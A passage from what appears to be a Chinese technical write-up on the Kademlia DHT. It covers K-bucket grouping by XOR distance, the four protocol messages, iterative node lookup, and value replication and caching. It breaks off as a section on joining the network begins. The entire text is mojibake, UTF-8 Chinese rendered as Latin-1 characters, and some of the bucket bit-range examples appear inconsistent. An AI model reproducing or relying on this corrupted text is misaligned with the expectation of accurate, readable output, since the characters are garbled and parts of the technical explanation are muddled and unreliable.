å¯¹ç¬¬ä¸€ä¸ªKæ¡¶æ¥è¯´ï¼Œå®ƒçš„åˆ—è¡¨ä¸­çš„æ¡ç›®å¿…é¡»ç¬¬ä¸€bitä¸èƒ½æ˜¯1ï¼Œå› ä¸ºç¬¬ä¸€ä¸ªKæ¡¶çš„å«ä¹‰æ˜¯å’Œè¯¥èŠ‚ç‚¹çš„è·ç¦»æ˜¯æœ€è¿œçš„ä¸€ä¸ªåˆ†ç»„ï¼Œç¬¬ä¸€ä½ä¸ä¸º1ï¼Œå®ƒèƒŒåçš„å«ä¹‰æ˜¯è¯¥åˆ†ç»„é‡Œçš„èŠ‚ç‚¹å’Œè¯¥èŠ‚ç‚¹çš„è·ç¦»è‡³å°‘åœ¨2^6ä»¥ä¸Šï¼Œå®ƒä»£è¡¨äº†æ•´ä¸ªç½‘ç»œä¸­å’Œè¯¥èŠ‚ç‚¹é€»è¾‘è·ç¦»æœ€è¿œçš„ä¸€äº›èŠ‚ç‚¹ å®ƒçš„åˆ—è¡¨æ¡ç›®æ˜¯è¿™æ ·çš„: 0 00000 ~ 0 111111\n3. å¯¹ç¬¬äºŒä¸ªKæ¡¶æ¥è¯´ï¼Œå®ƒçš„åˆ—è¡¨ä¸­çš„æ¡ç›®çš„ç¬¬ä¸€ä½å¿…é¡»æ˜¯1ï¼Œè¡¨ç¤ºå’Œå½“å‰èŠ‚ç‚¹çš„ç¬¬ä¸€bitç›¸åŒï¼Œç¬¬äºŒbitä¸èƒ½æ˜¯1ï¼Œè¿™æ ·ä»£è¡¨çš„æ„æ€æ˜¯ç¬¬äºŒä¸ªKæ¡¶é‡Œçš„èŠ‚ç‚¹å’Œè¯¥èŠ‚ç‚¹çš„è·ç¦»æ˜¯ä»‹äºMAX(2bit)å’ŒMIN(1bit)ä¹‹é—´çš„è·ç¦»ï¼Œå®ƒçš„åˆ—è¡¨æ¡ç›®æ˜¯è¿™æ ·çš„: 10 0000 ~ 10 1111\n4. ç¬¬ä¸‰ä¸ªKæ¡¶çš„æƒ…å†µå’Œå‰2ä¸ªç›¸åŒ  \n5. å¯¹ç¬¬å››ä¸ªKæ¡¶çš„æ¥è¯´ï¼Œå®ƒçš„åˆ—è¡¨ä¸­çš„æ¡ç›®å‰ä¸‰ä½éƒ½æ˜¯1ï¼Œç¬¬å››ä½ä¸æ˜¯0ï¼Œå®ƒçš„åˆ—è¡¨æ¡ç›®æ˜¯è¿™æ ·çš„: 1111 00 ~ 1111 11\n6. åé¢çš„bitä½æƒ…å†µç±»æ¨ï¼Œå¯ä»¥çœ‹å‡ºï¼Œ<font color=red>è¶Šä½bitä½çš„Kæ¡¶çš„MAX(XOR)å°±è¶Šå°ï¼Œå®ƒçš„å¯å˜èŒƒå›´å°±è¶Šå°äº†ã€‚è¿™ä»£è¡¨äº†è¶Šä½bitä½çš„Kæ¡¶é‡Œå­˜å‚¨çš„éƒ½æ˜¯è·ç¦»å½“å‰èŠ‚ç‚¹è¶Šè¿‘çš„NodèŠ‚ç‚¹</font>\n\n\nè€Œæ¡ç›®åˆ—è¡¨ä»¥èŠ‚ç‚¹IDçš„ä¸€ä½(å³1bit)æ¥åˆ†ç»„æ˜¯æœ‰é“ç†çš„ï¼šæˆ‘ä»¬ä½¿ç”¨log2Nçš„æŒ‡æ•°åˆ†çº§æ–¹æ³•æŠŠé™¤å½“å‰èŠ‚ç‚¹çš„å…¨ç½‘æ‰€æœ‰èŠ‚ç‚¹éƒ½è¿›è¡Œäº†åˆ†ç»„ï¼Œå½“åˆ«çš„èŠ‚ç‚¹æ¥å‘å½“å‰èŠ‚ç‚¹è¯·æ±‚æŸä¸ªèµ„æºHASHçš„æ—¶å€™ï¼Œå°†å¾…æœç´¢å¯»å€çš„\"ç›®æ ‡èŠ‚ç‚¹ID\"å’Œè·¯ç”±è¡¨è¿›è¡Œå¼‚æˆ–ï¼Œä¼šæœ‰2ç§æƒ…å†µ\n\n1. æ‰¾åˆ°æŸä¸ªæ¡ç›®å’Œç›®æ ‡èŠ‚ç‚¹XORä¸º0ï¼Œå³å·²ç»å¯»å€æˆåŠŸï¼Œåˆ™ç›´æ¥è¿”å›è¿™ä¸ªæ¡ç›®ç»™requesterå³å¯\n2. <font color=red>å¦‚æœæ²¡æ‰¾åˆ°XORç»“æœä¸º0çš„æ¡ç›®ï¼Œåˆ™é€‰å–é‚£ä¸ªXORå€¼æœ€å°çš„æ¡ç›®å¯¹åº”çš„Kæ¡¶ä¸­çš„Kä¸ªæ¡ç›®è¿”å›ç»™requesterï¼Œå› ä¸ºè¿™äº›æ¡ç›®æ˜¯æœ€æœ‰å¯èƒ½å­˜å‚¨äº†ç›®æ ‡èŠ‚ç‚¹IDæ¡ç›®çš„</font>\n\n\næ¯ä¸ªåˆ—è¡¨å¯¹åº”äºä¸èŠ‚ç‚¹ç›¸è·\"ç‰¹å®šèŒƒå›´è·ç¦»\"çš„ä¸€äº›èŠ‚ç‚¹ï¼ŒèŠ‚ç‚¹çš„ç¬¬nä¸ªåˆ—è¡¨ä¸­æ‰€æ‰¾åˆ°çš„èŠ‚ç‚¹çš„ç¬¬nä½ä¸è¯¥èŠ‚ç‚¹çš„ç¬¬nä½è‚¯å®šä¸åŒï¼Œè€Œå‰n-1ä½ç›¸åŒ\n\n```\n1. è¿™å°±æ„å‘³ç€å¾ˆå®¹æ˜“ä½¿ç”¨ç½‘ç»œä¸­è¿œç¦»è¯¥èŠ‚ç‚¹çš„ä¸€åŠèŠ‚ç‚¹æ¥å¡«å……ç¬¬ä¸€ä¸ªåˆ—è¡¨(ç¬¬ä¸€ä½ä¸åŒçš„èŠ‚ç‚¹æœ€å¤šæœ‰ä¸€åŠ)\n2. è€Œç”¨ç½‘ç»œä¸­å››åˆ†ä¹‹ä¸€çš„èŠ‚ç‚¹æ¥å¡«å……ç¬¬äºŒä¸ªåˆ—è¡¨(æ¯”ç¬¬ä¸€ä¸ªåˆ—è¡¨ä¸­çš„é‚£äº›èŠ‚ç‚¹ç¦»è¯¥èŠ‚ç‚¹æ›´è¿‘ä¸€ä½)\n3. ä¾æ¬¡ç±»æ¨ã€‚å¦‚æœIDæœ‰128ä¸ªäºŒè¿›åˆ¶ä½ï¼Œåˆ™ç½‘ç»œä¸­çš„æ¯ä¸ªèŠ‚ç‚¹æŒ‰ç…§ä¸åŒçš„å¼‚æˆ–è·ç¦»æŠŠå…¶ä»–æ‰€æœ‰çš„èŠ‚ç‚¹åˆ†æˆäº†128ç±»ï¼ŒIDçš„æ¯ä¸€ä½å¯¹åº”äºå…¶ä¸­çš„ä¸€ç±»\n```\n\néšç€ç½‘ç»œä¸­çš„èŠ‚ç‚¹è¢«æŸèŠ‚ç‚¹å‘ç°ï¼Œå®ƒä»¬è¢«é€æ­¥åŠ å…¥åˆ°è¯¥èŠ‚ç‚¹çš„ç›¸åº”çš„åˆ—è¡¨ä¸­ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸­åŒ…æ‹¬\n\n1. <font color=red>å‘èŠ‚ç‚¹åˆ—è¡¨ä¸­å­˜ä¿¡æ¯: å½•å…¥åˆ«çš„èŠ‚ç‚¹å‘å¸ƒçš„å£°æ˜</font>\n2. ä»èŠ‚ç‚¹åˆ—è¡¨ä¸­å–ä¿¡æ¯çš„æ“ä½œ\n3. ç”šè‡³è¿˜åŒ…æ‹¬å½“æ—¶ååŠ©å…¶ä»–èŠ‚ç‚¹å¯»æ‰¾ç›¸åº”é”®å¯¹åº”å€¼çš„æ“ä½œ: è½¬å‘å…¶ä»–èŠ‚ç‚¹çš„å¯»å€è¯·æ±‚\n\n\nè¿™ä¸ªè¿‡ç¨‹ä¸­å‘ç°çš„æ‰€æœ‰èŠ‚ç‚¹éƒ½å°†è¢«åŠ å…¥åˆ°èŠ‚ç‚¹çš„åˆ—è¡¨ä¹‹ä¸­ï¼Œå› æ­¤èŠ‚ç‚¹å¯¹æ•´ä¸ªç½‘ç»œçš„æ„ŸçŸ¥æ˜¯åŠ¨æ€çš„ï¼Œè¿™ä½¿å¾—ç½‘ç»œä¸€ç›´ä¿æŒç€é¢‘ç¹åœ°æ›´æ–°ï¼Œå¢å¼ºäº†æŠµå¾¡é”™è¯¯å’Œæ”»å‡»çš„èƒ½åŠ›\n\n---\n\nåœ¨Kademliaç›¸å…³çš„è®ºæ–‡ä¸­ï¼Œåˆ—è¡¨ä¹Ÿç§°ä¸ºKæ¡¶ï¼Œå…¶ä¸­Kæ˜¯ä¸€ä¸ªç³»ç»Ÿå˜é‡ï¼Œå¦‚20ï¼Œæ¯ä¸€ä¸ªKæ¡¶æ˜¯ä¸€ä¸ªæœ€å¤šåŒ…å«Kä¸ªæ¡ç›®çš„åˆ—è¡¨ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œç½‘ç»œä¸­æ‰€æœ‰èŠ‚ç‚¹çš„ä¸€ä¸ªåˆ—è¡¨(å¯¹åº”äºæŸä¸€ä½ï¼Œä¸è¯¥èŠ‚ç‚¹ç›¸è·ä¸€ä¸ªç‰¹å®šçš„è·ç¦»)æœ€å¤šåŒ…å«20ä¸ªèŠ‚ç‚¹ã€‚éšç€å¯¹åº”çš„bitä½å˜ä½(å³å¯¹åº”çš„å¼‚æˆ–è·ç¦»è¶Šæ¥è¶ŠçŸ­)(bitä½è¶Šå°ï¼Œå¯èƒ½çš„è·ç¦»MAXå€¼å°±è¶Šå°äº†ï¼Œå³è·ç¦»ç›®æ ‡èŠ‚ç‚¹çš„è·ç¦»è¶Šè¿‘)ï¼ŒKæ¡¶åŒ…å«çš„å¯èƒ½èŠ‚ç‚¹æ•°è¿…é€Ÿä¸‹é™(Kå®šä¹‰çš„æ˜¯è¯¥bitå¯¹åº”çš„åˆ—è¡¨æœ€å¤šèƒ½å­˜å‚¨Kä¸ªæ¡ç›®ï¼Œä½†ä¸ä¸€å®šéƒ½æ˜¯Kå­˜æ»¡ï¼Œå½“åˆ°æœ€ä½å‡ ä¸ªbitä½çš„æ—¶å€™ï¼ŒKæ¡¶é‡Œå¯èƒ½å°±åªæœ‰å‡ ä¸ªä¸ªä½æ•°çš„æ¡ç›®äº†)ã€‚ç”±äºç½‘ç»œä¸­èŠ‚ç‚¹çš„å®é™…æ•°é‡è¿œè¿œå°äºå¯èƒ½IDå·çš„æ•°é‡ï¼Œæ‰€ä»¥å¯¹åº”é‚£äº›çŸ­è·ç¦»çš„æŸäº›Kæ¡¶å¯èƒ½ä¸€ç›´æ˜¯ç©ºçš„(å¦‚æœå¼‚æˆ–è·ç¦»åªæœ‰1ï¼Œå¯èƒ½çš„æ•°é‡å°±æœ€å¤§åªèƒ½ä¸º1ï¼Œè¿™ä¸ªå¼‚æˆ–è·ç¦»ä¸º1çš„èŠ‚ç‚¹å¦‚æœæ²¡æœ‰å‘ç°ï¼Œåˆ™å¯¹åº”äºå¼‚æˆ–è·ç¦»ä¸º1çš„Kæ¡¶åˆ™æ˜¯ç©ºçš„)\n\n\n![1](Kademlia_DHT_KRPC_BitTorrentåè®®/1.png)\n\nä»è¿™ä¸ªé€»è¾‘å›¾ä¸­å¯ä»¥çœ‹å‡º\n\n```\n1. èŠ‚ç‚¹çš„HASHå€¼å†³å®šäº†å®ƒä»¬çš„é€»è¾‘è·ç¦»ï¼Œå³Kademliaç½‘ç»œä¸­çš„ä¸‹ä¸€è·³å¯»å€æ˜¯æ ¹æ®HASH XORçš„å€¼èŒƒå›´(æ•°å€¼å¤§å°èŒƒå›´)ç»“æœå†³å®šçš„\n2. è¯¥ç½‘ç»œæœ€å¤§å¯æœ‰2^3ï¼Œå³8ä¸ªå…³é”®å­—å’ŒèŠ‚ç‚¹ï¼Œç›®å‰å…±æœ‰7ä¸ªèŠ‚ç‚¹åŠ å…¥ï¼Œæ¯ä¸ªèŠ‚ç‚¹ç”¨ä¸€ä¸ªå°åœˆè¡¨ç¤º(åœ¨æ ‘çš„åº•éƒ¨)\n3. è€ƒè™‘é‚£ä¸ªç”¨é»‘åœˆæ ‡æ³¨çš„èŠ‚ç‚¹6ï¼Œå®ƒå…±æœ‰3ä¸ªKæ¡¶(å³3bitä½)\n\nèŠ‚ç‚¹0ï¼Œ1å’Œ2(äºŒè¿›åˆ¶è¡¨ç¤ºä¸º000ï¼Œ001å’Œ010)æ˜¯ç¬¬ä¸€ä¸ªKæ¡¶çš„å€™é€‰èŠ‚ç‚¹\n000 -> 110: 6\n001 -> 110: 5\n010 -> 110: 4\n\nèŠ‚ç‚¹3ç›®å‰(äºŒè¿›åˆ¶è¡¨ç¤ºä¸º011)è¿˜æ²¡æœ‰åŠ å…¥ç½‘ç»œ\n\nèŠ‚ç‚¹4å’ŒèŠ‚ç‚¹5(äºŒè¿›åˆ¶è¡¨ç¤ºåˆ†åˆ«ä¸º100å’Œ101)æ˜¯ç¬¬äºŒä¸ªKæ¡¶çš„å€™é€‰èŠ‚ç‚¹\n100 -> 110: 2\n101 -> 110: 1 \n\nèŠ‚ç‚¹7(äºŒè¿›åˆ¶è¡¨ç¤ºä¸º111)æ˜¯ç¬¬3ä¸ªKæ¡¶çš„å€™é€‰èŠ‚ç‚¹\n111 -> 110: 1\n```\n\nå›¾ä¸­3ä¸ªKæ¡¶éƒ½ç”¨ç°è‰²åœˆè¡¨ç¤ºï¼Œå‡å¦‚Kæ¡¶çš„å¤§å°(å³Kå€¼)æ˜¯2ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªKæ¡¶åªèƒ½åŒ…å«3ä¸ªèŠ‚ç‚¹ä¸­çš„2ä¸ªã€‚ä¼—æ‰€å‘¨çŸ¥ï¼Œé‚£äº›é•¿æ—¶é—´åœ¨çº¿è¿æ¥çš„èŠ‚ç‚¹æœªæ¥é•¿æ—¶é—´åœ¨çº¿çš„å¯èƒ½æ€§æ›´å¤§ï¼ŒåŸºäºè¿™ç§é™æ€ç»Ÿè®¡åˆ†å¸ƒçš„è§„å¾‹ï¼ŒKademliaé€‰æ‹©æŠŠé‚£äº›é•¿æ—¶é—´åœ¨çº¿çš„èŠ‚ç‚¹å­˜å…¥Kæ¡¶ï¼Œè¿™ä¸€æ–¹æ³•å¢é•¿äº†æœªæ¥æŸä¸€æ—¶åˆ»æœ‰æ•ˆèŠ‚ç‚¹çš„æ•°é‡(hot hint)ï¼ŒåŒæ—¶ä¹Ÿæä¾›äº†æ›´ä¸ºç¨³å®šçš„ç½‘ç»œã€‚å½“æŸä¸ªKæ¡¶å·²æ»¡ï¼Œè€Œåˆå‘ç°äº†ç›¸åº”äºè¯¥æ¡¶çš„æ–°èŠ‚ç‚¹çš„æ—¶å€™ï¼Œé‚£ä¹ˆï¼Œå°±é¦–å…ˆæ£€æŸ¥Kæ¡¶ä¸­æœ€æ—©è®¿é—®çš„èŠ‚ç‚¹ï¼Œå‡å¦‚è¯¥èŠ‚ç‚¹ä»ç„¶å­˜æ´»ï¼Œé‚£ä¹ˆæ–°èŠ‚ç‚¹å°±è¢«å®‰æ’åˆ°ä¸€ä¸ªé™„å±åˆ—è¡¨ä¸­(ä½œä¸ºä¸€ä¸ªæ›¿ä»£ç¼“å­˜). åªæœ‰å½“Kæ¡¶ä¸­çš„æŸä¸ªèŠ‚ç‚¹åœæ­¢å“åº”çš„æ—¶å€™ï¼Œæ›¿ä»£cacheæ‰è¢«ä½¿ç”¨ã€‚æ¢å¥è¯è¯´ï¼Œæ–°å‘ç°çš„èŠ‚ç‚¹åªæœ‰åœ¨è€çš„èŠ‚ç‚¹æ¶ˆå¤±(å¤±æ•ˆ)åæ‰è¢«ä½¿ç”¨\n\n\n### 0x4: åè®®æ¶ˆæ¯\n\nKademliaåè®®å…±æœ‰å››ç§æ¶ˆæ¯\n\n```\n1. PINGæ¶ˆæ¯: ç”¨æ¥æµ‹è¯•èŠ‚ç‚¹æ˜¯å¦ä»ç„¶åœ¨çº¿\n2. STOREæ¶ˆæ¯: åœ¨æŸä¸ªèŠ‚ç‚¹ä¸­å­˜å‚¨ä¸€ä¸ªé”®å€¼å¯¹\n3. FIND_NODEæ¶ˆæ¯: æ¶ˆæ¯è¯·æ±‚çš„æ¥æ”¶è€…å°†è¿”å›è‡ªå·±æ¡¶ä¸­ç¦»è¯·æ±‚é”®å€¼æœ€è¿‘çš„Kä¸ªèŠ‚ç‚¹: å°†è¯·æ±‚è€…è¯·æ±‚çš„èŠ‚ç‚¹HASHå’Œè‡ªå·±çš„HASHè¿›è¡ŒXORè®¡ç®—ï¼Œå°†è®¡ç®—ç»“æœ\n4. FIND_VALUEæ¶ˆæ¯: ä¸FIND_NODEä¸€æ ·ï¼Œä¸è¿‡å½“è¯·æ±‚çš„æ¥æ”¶è€…å­˜æœ‰è¯·æ±‚è€…æ‰€è¯·æ±‚çš„é”®çš„æ—¶å€™ï¼Œå®ƒå°†è¿”å›ç›¸åº”é”®çš„å€¼\n```\n\næ¯ä¸€ä¸ªRPCæ¶ˆæ¯ä¸­éƒ½åŒ…å«ä¸€ä¸ªå‘èµ·è€…åŠ å…¥çš„éšæœºå€¼ï¼Œè¿™ä¸€ç‚¹ç¡®ä¿å“åº”æ¶ˆæ¯åœ¨æ”¶åˆ°çš„æ—¶å€™èƒ½å¤Ÿä¸å‰é¢å‘é€çš„è¯·æ±‚æ¶ˆæ¯åŒ¹é…\n\n\n### 0x5: å®šä½èŠ‚ç‚¹\n\nèŠ‚ç‚¹æŸ¥è¯¢å¯ä»¥å¼‚æ­¥è¿›è¡Œï¼Œä¹Ÿå¯ä»¥åŒæ—¶è¿›è¡Œï¼ŒåŒæ—¶æŸ¥è¯¢çš„æ•°é‡ç”±Î±è¡¨ç¤ºï¼Œä¸€èˆ¬æ˜¯3\n\n\n1. åœ¨èŠ‚ç‚¹æŸ¥è¯¢çš„æ—¶å€™ï¼Œå®ƒå…ˆå¾—åˆ°å®ƒKæ¡¶ä¸­ç¦»æ‰€æŸ¥è¯¢çš„é”®å€¼æœ€è¿‘çš„Kä¸ªèŠ‚ç‚¹(XORå€¼æœ€å°çš„é‚£ä¸ªæ¡ç›®æ‰€åœ¨çš„åˆ†ç»„)ï¼Œç„¶åå‘è¿™Kä¸ªèŠ‚ç‚¹å‘èµ·FIND_NODEæ¶ˆæ¯è¯·æ±‚(å› ä¸ºè¿™ä¸ªKæ¡¶å†…çš„èŠ‚ç‚¹æœ€æœ‰å¯èƒ½å¯»å€æˆåŠŸ)\n2. æ¶ˆæ¯æ¥æ”¶è€…æ”¶åˆ°è¿™äº›è¯·æ±‚æ¶ˆæ¯åå°†åœ¨ä»–ä»¬çš„Kæ¡¶ä¸­è¿›è¡ŒæŸ¥è¯¢ï¼Œå¦‚æœä»–ä»¬çŸ¥é“ç¦»è¢«æŸ¥é”®æ›´è¿‘çš„èŠ‚ç‚¹ï¼Œä»–ä»¬å°±è¿”å›è¿™äº›èŠ‚ç‚¹(æœ€å¤šKä¸ª)\n    + æ‰¾åˆ°æŸä¸ªæ¡ç›®å’Œç›®æ ‡èŠ‚ç‚¹XORä¸º0ï¼Œå³å·²ç»å¯»å€æˆåŠŸï¼Œåˆ™ç›´æ¥è¿”å›è¿™ä¸ªæ¡ç›®ç»™requesterå³å¯\n    + å¦‚æœæ²¡æ‰¾åˆ°XORç»“æœä¸º0çš„æ¡ç›®ï¼Œåˆ™é€‰å–é‚£ä¸ªXORå€¼æœ€å°çš„æ¡ç›®å¯¹åº”çš„Kæ¡¶ä¸­çš„Kä¸ªæ¡ç›®è¿”å›ç»™requesterï¼Œå› ä¸ºè¿™äº›æ¡ç›®æ˜¯æœ€æœ‰å¯èƒ½å­˜å‚¨äº†ç›®æ ‡èŠ‚ç‚¹IDæ¡ç›®çš„\n3. <font color=\"red\">æ¶ˆæ¯çš„è¯·æ±‚è€…åœ¨æ”¶åˆ°å“åº”åå°†ä½¿ç”¨å®ƒæ‰€æ”¶åˆ°çš„å“åº”ç»“æœæ¥æ›´æ–°å®ƒçš„ç»“æœåˆ—è¡¨ï¼Œè¿”å›çš„ç»“æœä¹Ÿåº”è¯¥æ’å…¥åˆ°åˆšæ‰å‘èµ·è¯·æ±‚çš„é‚£ä¸ªKæ¡¶é‡Œï¼Œè¿™ä¸ªç»“æœåˆ—è¡¨æ€»æ˜¯ä¿æŒKä¸ªå“åº”FIND_NODEæ¶ˆæ¯è¯·æ±‚çš„æœ€ä¼˜èŠ‚ç‚¹(å³ç¦»è¢«æœç´¢é”®æ›´è¿‘çš„Kä¸ªèŠ‚ç‚¹)</font>\n4. ç„¶åæ¶ˆæ¯å‘èµ·è€…å°†å‘è¿™Kä¸ªæœ€ä¼˜èŠ‚ç‚¹å‘èµ·æŸ¥è¯¢ï¼Œå› ä¸ºåˆšå¼€å§‹çš„æŸ¥è¯¢å¾ˆå¯èƒ½Kæ¡¶é‡Œå­˜çš„ä¸å…¨æ˜¯ç›®æ ‡èŠ‚ç‚¹ï¼Œè€Œæ˜¯æ½œåœ¨åœ°ç¦»ç›®æ ‡èŠ‚ç‚¹è¾ƒè¿‘çš„èŠ‚ç‚¹\n5. ä¸æ–­åœ°è¿­ä»£æ‰§è¡Œä¸Šè¿°æŸ¥è¯¢è¿‡ç¨‹ã€‚å› ä¸ºæ¯ä¸€ä¸ªèŠ‚ç‚¹æ¯”å…¶ä»–èŠ‚ç‚¹å¯¹å®ƒå‘¨è¾¹çš„èŠ‚ç‚¹æœ‰æ›´å¥½çš„æ„ŸçŸ¥èƒ½åŠ›(æ°´æ³¢æ‰©æ•£å¼çš„èŠ‚ç‚¹å¯»å€æ–¹å¼)ï¼Œå› æ­¤å“åº”ç»“æœå°†æ˜¯ä¸€æ¬¡ä¸€æ¬¡ç¦»è¢«æœç´¢é”®å€¼è¶Šæ¥è¶Šè¿‘çš„æŸèŠ‚ç‚¹ã€‚å¦‚æœæœ¬æ¬¡å“åº”ç»“æœä¸­çš„èŠ‚ç‚¹æ²¡æœ‰æ¯”å‰æ¬¡å“åº”ç»“æœä¸­çš„èŠ‚ç‚¹ç¦»è¢«æœç´¢é”®å€¼æ›´è¿‘äº†(å³å‘ç°è¿™è½®æŸ¥è¯¢çš„ç»“æœæœªå‘ç”Ÿdiffå˜åŒ–äº†)ï¼Œè¿™ä¸ªæŸ¥è¯¢è¿­ä»£ä¹Ÿå°±ç»ˆæ­¢äº†\n6. å½“è¿™ä¸ªè¿­ä»£ç»ˆæ­¢çš„æ—¶å€™ï¼Œå“åº”ç»“æœé›†ä¸­çš„Kä¸ªæœ€ä¼˜èŠ‚ç‚¹å°±æ˜¯æ•´ä¸ªç½‘ç»œä¸­ç¦»è¢«æœç´¢é”®å€¼æœ€è¿‘çš„Kä¸ªèŠ‚ç‚¹(ä»ä»¥ä¸Šè¿‡ç¨‹çœ‹ï¼Œè¿™æ˜¾ç„¶æ˜¯å±€éƒ¨çš„ï¼Œè€Œéæ•´ä¸ªç½‘ç»œï¼Œå› ä¸ºè¿™æœ¬è´¨å’Œæœ€ä¼˜è§£æœç´¢ç®—æ³•ä¸€æ ·ï¼Œå¯èƒ½é™·å…¥å±€éƒ¨æœ€ä¼˜è§£è€Œæ— æ³•è·å¾—å…¨å±€æœ€ä¼˜è§£) \n7. èŠ‚ç‚¹ä¿¡æ¯ä¸­å¯ä»¥å¢åŠ ä¸€ä¸ªå¾€è¿”æ—¶é—´ï¼Œæˆ–è€…å«åšRTTçš„å‚æ•°ï¼Œè¿™ä¸ªå‚æ•°å¯ä»¥è¢«ç”¨æ¥å®šä¹‰ä¸€ä¸ªé’ˆå¯¹æ¯ä¸ªè¢«æŸ¥è¯¢èŠ‚ç‚¹çš„è¶…æ—¶è®¾ç½®ï¼Œå³å½“å‘æŸä¸ªèŠ‚ç‚¹å‘èµ·çš„æŸ¥è¯¢è¶…æ—¶çš„æ—¶å€™ï¼Œå¦ä¸€ä¸ªæŸ¥è¯¢æ‰ä¼šå‘èµ·ï¼Œå½“ç„¶ï¼Œé’ˆå¯¹æŸä¸ªèŠ‚ç‚¹çš„æŸ¥è¯¢åœ¨åŒä¸€æ—¶åˆ»ä»æ¥ä¸è¶…è¿‡Î±ä¸ª\n\n\n### 0x6: å®šä½å’Œå†—ä½™æ‹·è´èµ„æº\n\né€šè¿‡æŠŠèµ„æºä¿¡æ¯ä¸é”®è¿›è¡Œæ˜ å°„ï¼Œèµ„æºå³å¯è¿›è¡Œå®šä½ï¼Œæ‚å‡‘è¡¨æ˜¯å…¸å‹çš„ç”¨æ¥æ˜ å°„çš„æ‰‹æ®µã€‚ç”±äºä»¥å‰çš„STOREæ¶ˆæ¯ï¼Œå­˜å‚¨èŠ‚ç‚¹å°†ä¼šæœ‰å¯¹åº”STOREæ‰€å­˜å‚¨çš„ç›¸å…³èµ„æºçš„ä¿¡æ¯ã€‚å®šä½èµ„æºæ—¶ï¼Œå¦‚æœä¸€ä¸ªèŠ‚ç‚¹å­˜æœ‰ç›¸åº”çš„èµ„æºçš„å€¼çš„æ—¶å€™ï¼Œå®ƒå°±è¿”å›è¯¥èµ„æºï¼Œæœç´¢ä¾¿ç»“æŸäº†ï¼Œé™¤äº†è¯¥ç‚¹ä»¥å¤–ï¼Œå®šä½èµ„æºä¸å®šä½ç¦»é”®æœ€è¿‘çš„èŠ‚ç‚¹çš„è¿‡ç¨‹ç›¸ä¼¼\n\n\n1. è€ƒè™‘åˆ°èŠ‚ç‚¹æœªå¿…éƒ½åœ¨çº¿çš„æƒ…å†µï¼Œèµ„æºçš„å€¼è¢«å­˜åœ¨å¤šä¸ªèŠ‚ç‚¹ä¸Š(èŠ‚ç‚¹ä¸­çš„Kä¸ª)ï¼Œå¹¶ä¸”ï¼Œä¸ºäº†æä¾›å†—ä½™ï¼Œè¿˜æœ‰å¯èƒ½åœ¨æ›´å¤šçš„èŠ‚ç‚¹ä¸Šå‚¨å­˜å€¼\n2. å‚¨å­˜å€¼çš„èŠ‚ç‚¹å°†å®šæœŸæœç´¢ç½‘ç»œä¸­ä¸å‚¨å­˜å€¼æ‰€å¯¹åº”çš„é”®æ¥è¿‘çš„Kä¸ªèŠ‚ç‚¹å¹¶ä¸”æŠŠå€¼å¤åˆ¶åˆ°è¿™äº›èŠ‚ç‚¹ä¸Šï¼Œè¿™äº›èŠ‚ç‚¹å¯ä½œä¸ºé‚£äº›ä¸‹çº¿çš„èŠ‚ç‚¹çš„è¡¥å……\n3. å¦å¤–ï¼Œå¯¹äºé‚£äº›æ™®éæµè¡Œçš„å†…å®¹ï¼Œå¯èƒ½æœ‰æ›´å¤šçš„è¯·æ±‚éœ€æ±‚ï¼Œé€šè¿‡è®©é‚£äº›è®¿é—®å€¼çš„èŠ‚ç‚¹æŠŠå€¼å­˜å‚¨åœ¨é™„è¿‘çš„ä¸€äº›èŠ‚ç‚¹ä¸Š(ä¸åœ¨Kä¸ªæœ€è¿‘èŠ‚ç‚¹çš„èŒƒå›´ä¹‹ç±»)æ¥å‡å°‘å­˜å‚¨å€¼çš„é‚£äº›èŠ‚ç‚¹çš„è´Ÿè½½ï¼Œè¿™ç§æ–°çš„å­˜å‚¨æŠ€æœ¯å°±æ˜¯ç¼“å­˜æŠ€æœ¯ï¼Œé€šè¿‡è¿™ç§æŠ€æœ¯ï¼Œä¾èµ–äºè¯·æ±‚çš„æ•°é‡ï¼Œèµ„æºçš„å€¼è¢«å­˜å‚¨åœ¨ç¦»é”®è¶Šæ¥è¶Šè¿œçš„é‚£äº›èŠ‚ç‚¹ä¸Š(èµ„æºçƒ­åº¦è¶Šé«˜ï¼Œç¼“å­˜cacheå°±è¶Šå¹¿æ³›)ï¼Œè¿™ä½¿å¾—é‚£äº›æµè¡Œçš„æœç´¢å¯ä»¥æ›´å¿«åœ°æ‰¾åˆ°èµ„æºçš„å‚¨å­˜è€…\n5. ç”±äºè¿”å›å€¼çš„èŠ‚ç‚¹çš„NODE_IDè¿œç¦»å€¼æ‰€å¯¹åº”çš„å…³é”®å­—ï¼Œç½‘ç»œä¸­çš„\"çƒ­ç‚¹\"åŒºåŸŸå­˜åœ¨çš„å¯èƒ½æ€§ä¹Ÿé™ä½äº†ã€‚ä¾æ®ä¸é”®çš„è·ç¦»ï¼Œç¼“å­˜çš„é‚£äº›èŠ‚ç‚¹åœ¨ä¸€æ®µæ—¶é—´ä»¥åå°†ä¼šåˆ é™¤æ‰€å­˜å‚¨çš„ç¼“å­˜å€¼ã€‚DHTçš„æŸäº›å®ç°(å¦‚Kad)å³ä¸æä¾›å†—ä½™(å¤åˆ¶)èŠ‚ç‚¹ä¹Ÿä¸æä¾›ç¼“å­˜ï¼Œè¿™ä¸»è¦æ˜¯ä¸ºäº†èƒ½å¤Ÿå¿«é€Ÿå‡å°‘ç³»ç»Ÿä¸­çš„é™ˆæ—§ä¿¡æ¯ã€‚åœ¨è¿™ç§ç½‘ç»œä¸­ï¼Œæä¾›æ–‡ä»¶çš„é‚£äº›èŠ‚ç‚¹å°†ä¼šå‘¨æœŸæ€§åœ°æ›´æ–°ç½‘ç»œä¸Šçš„ä¿¡æ¯(é€šè¿‡NODE_LOOKUPæ¶ˆæ¯å’ŒSTOREæ¶ˆæ¯)ã€‚å½“å­˜æœ‰æŸä¸ªæ–‡ä»¶çš„æ‰€æœ‰èŠ‚ç‚¹éƒ½ä¸‹çº¿äº†ï¼Œå…³äºè¯¥æ–‡ä»¶çš„ç›¸å…³çš„å€¼(æºå’Œå…³é”®å­—)çš„æ›´æ–°ä¹Ÿå°±åœæ­¢äº†ï¼Œè¯¥æ–‡ä»¶çš„ç›¸å…³ä¿¡æ¯ä¹Ÿå°±ä»ç½‘ç»œä¸Šå®Œå…¨æ¶ˆå¤±äº† \n\n\n### 0x7: åŠ å…¥ç½‘ç»œ\n\n1. æƒ³è¦åŠ 